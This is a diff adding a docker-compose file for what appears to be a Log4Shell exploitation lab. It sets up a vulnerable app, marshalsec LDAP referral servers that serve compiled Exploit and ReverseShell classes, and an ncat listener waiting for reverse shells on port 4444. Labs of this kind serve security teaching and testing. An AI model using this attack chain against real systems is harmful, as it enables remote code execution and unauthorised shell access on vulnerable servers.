@@ -1,0 +1,59 @@
+services:
+  vulnerable-app:
+    build: ./vulnerable-app
+    ports:
+      - "8080:8080"
+    networks:
+      - log4j-net
+
+  # LDAP server for simple Exploit
+  ldap-server-exploit:
+    image: amazoncorretto:8
+    working_dir: /exploit
+    volumes:
+      - ./exploit:/exploit
+    command: sh -c "yum install -y python3 && 
+                    javac Exploit.java && 
+                    python3 -m http.server 8888 & java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://ldap-server-exploit:8888/#Exploit' 1389"
+    ports:
+      - "1389:1389"
+      - "8888:8888"
+    networks:
+      - log4j-net
+
+  # LDAP server for ReverseShell
+  ldap-server-revshell:
+    image: amazoncorretto:8
+    working_dir: /exploit
+    volumes:
+      - ./exploit:/exploit
+    command: sh -c "yum install -y python3 && 
+                    javac ReverseShell.java && 
+                    python3 -m http.server 9999 & java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://ldap-server-revshell:9999/#ReverseShell' 1390"
+    ports:
+      - "1390:1390"
+      - "9999:9999"
+    networks:
+      - log4j-net
+
+  # Attacker machine listening for reverse shell
+  attacker-listener:
+    image: amazoncorretto:8
+    command: >
+      sh -c "yum install -y nmap-ncat &&
+            echo 'Waiting for reverse shell connections on port 4444...' &&
+            while true; do
+              ncat -lvp 4444     # <- listen-only, no -c or -e
+              echo 'Connection closed. Listening again...';
+              sleep 1;
+            done"
+    ports:
+      - "4444:4444"
+    stdin_open: true
+    tty: true
+    networks:
+      - log4j-net
+
+
+networks:
+  log4j-net:
